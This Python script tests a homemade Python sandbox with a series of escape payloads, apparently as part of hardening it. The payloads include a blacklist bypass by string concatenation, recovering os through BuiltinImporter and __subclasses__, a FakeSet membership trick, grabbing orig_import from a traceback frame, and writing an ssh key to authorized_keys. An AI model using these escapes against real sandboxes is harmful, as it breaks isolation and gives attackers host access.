#!/usr/bin/env python3
import traceback
import sys
from sandbox import Sandbox

### first example
# sb = Sandbox()
# sb.execute("""
# open('authorized_keys', 'w').write('ssh-ed25519 ...')
# """)

# blacklist words bypass
# sb = Sandbox()
# sb.execute("""
# __builtins__['op'+'en']('builtin-open.txt', 'w').write('pwn!')
# """)

### builtins clear bypass
# sb = Sandbox()
# sb.execute("""
# import os
# fd = os.open('import-os.txt', os.O_CREAT|os.O_WRONLY)
# os.write(fd, b'pwn!')
# """)

## safe_import bypass
# sb = Sandbox()
# sb.execute("""
# os = __loader__().load_module("os")
# fd = os.open('pwn-loader-builtin.txt', os.O_CREAT|os.O_WRONLY)
# os.write(fd, b'pwn!')
# exit()
# """)

### builtin loader deletion bypass
# sb = Sandbox()
# sb.execute("""
# loader = [
#     x
#     for x in ().__class__.__base__.__subclasses__()
#     if x.__name__ == "BuiltinImporter"
# ][0]

# os = loader.load_module("os")
# fd = os.open('pwn-loader-class.txt', os.O_CREAT|os.O_WRONLY)
# os.write(fd, b'pwn!')

# exit()
# """)

### __subclasses__ deletion bypass
# sb = Sandbox()
# sb.execute("""
# class FakeSet(set):
#   def __contains__(self, key):
#        return True
# __builtins__["set"] = FakeSet

# import os
# fd = os.open('pwn-fakeset.txt', os.O_CREAT|os.O_WRONLY)
# os.write(fd, b'pwn!')
# exit()
# """)

### readonly __builtin__ (not implemented) bypass
sb = Sandbox()
sb.execute("""
try:
  import os
except Exception as ex:
  orig_import = ex.__traceback__.tb_next.tb_frame.f_locals["orig_import"]

os = orig_import("os")
fd = os.open('traceback-import.txt', os.O_CREAT|os.O_WRONLY)
os.write(fd, b'pwn!')

exit()
""")

# I delete the traceback
# at this point python sandbox becomes difficult to use


# def main():
#     sb = Sandbox()
#     while True:
#         try:
#             inp = input(">> ")
#         except EOFError:
#             print()
#             break
#         except KeyboardInterrupt:
#             print()
#             continue

#         if inp == "exit":
#             break
#         try:
#             sb.execute(inp)
#         except Exception:
#             print(traceback.format_exc(), file=sys.stderr)


# if __name__ == '__main__':
#     main()
